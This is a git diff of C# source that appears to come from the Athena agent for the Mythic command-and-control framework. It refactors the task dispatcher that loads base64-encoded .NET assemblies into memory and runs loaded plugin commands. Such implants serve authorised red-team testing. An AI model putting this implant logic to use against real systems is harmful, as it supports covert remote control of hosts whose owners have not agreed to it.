@@ -1,5 +1,4 @@
 ﻿using Athena.Mythic.Model;
-
 using System;
 using System.Collections.Generic;
 using Athena.Commands.Model;
@@ -8,8 +7,6 @@ using Newtonsoft.Json;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Linq;
-using System.Text;
-using System.IO;
 
 namespace Athena.Commands
 {
@@ -200,6 +197,7 @@ namespace Athena.Commands
                     LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
                     break;
+                //Maybe get rid of this?
                 case "load-coresploit":
                     LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
@@ -247,6 +245,7 @@ namespace Athena.Commands
                     job.hasoutput = true;
                     break;
                 case "stop-assembly":
+                    //Will need to make this work
                     if(Globals.executeAseemblyThread != null)
                     {
                         Globals.executeAseemblyThread.Interrupt();
@@ -272,19 +271,7 @@ namespace Athena.Commands
                     break;
                 default:
                     checkAndRunPlugin(job);
-                    //Maybe convert the default to the loaded commands?
-                    //Can I have all the default plugins use one "case" statement to load?
-                    //job.taskresult = "Command not found.";
-                    //job.errored = true;
                     break;
-            }
-            if (!string.IsNullOrEmpty(job.taskresult))
-            {
-                job.hasoutput = true;
-            }
-            else
-            {
-                job.hasoutput = false;
             }
         }
 
@@ -298,71 +285,29 @@ namespace Athena.Commands
             }
             catch
             {
-
+                //Fail silently
             }
         }
 
-        static string checkAndRunPlugin(string name, Dictionary<string, object> s)
+        static void checkAndRunPlugin(MythicJob job)
         {
-            foreach(var kvp in s)
+            if (Globals.loadedcommands.ContainsKey(job.task.command))
             {
-                Console.WriteLine("Key: " + kvp.Key);
-                Console.WriteLine("Value: " + kvp.Value);
-            }
-            if (Globals.loadedcommands.ContainsKey(name))
-            {
-                return AssemblyHandler.RunLoadedCommand(name, s);
+                job.taskresult =  AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
             }
             else
             {
-                return "";
+                job.errored = true;
+                job.taskresult = "Plugin not loaded. Please use the load command to load the plugin!";
             }
-        }
-        static void checkAndRunPlugin(MythicJob job)
-        {
-            job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
+            
             job.complete = true;
             job.hasoutput = true;
-            if (string.IsNullOrEmpty(job.taskresult))
-            {
-                job.errored = true;
-                job.taskresult = "Plugin not loaded. Please use load to load the plugin!";
-            }
-            else if (job.taskresult.StartsWith("[ERROR]"))
+            if (job.taskresult.StartsWith("[ERROR]"))
             {
                 job.errored = true;
                 job.taskresult = job.taskresult.Replace("[ERROR]", "");
             }
-
-
-
-
-            //foreach (var kvp in s)
-            //{
-            //    Console.WriteLine("Key: " + kvp.Key);
-            //    Console.WriteLine("Value: " + kvp.Value);
-            //}
-            //if (Globals.loadedcommands.ContainsKey(name))
-            //{
-            //    return AssemblyHandler.RunLoadedCommand(name, s);
-            //}
-            //else
-            //{
-            //    return "";
-            //}
         }
-        //static void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
-        //{
-        //    try
-        //    {
-        //        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
-        //        job.taskresult += e.Value;
-        //        job.hasoutput = true;
-        //    }
-        //    catch
-        //    {
-
-        //    }
-        //}
     }
 }
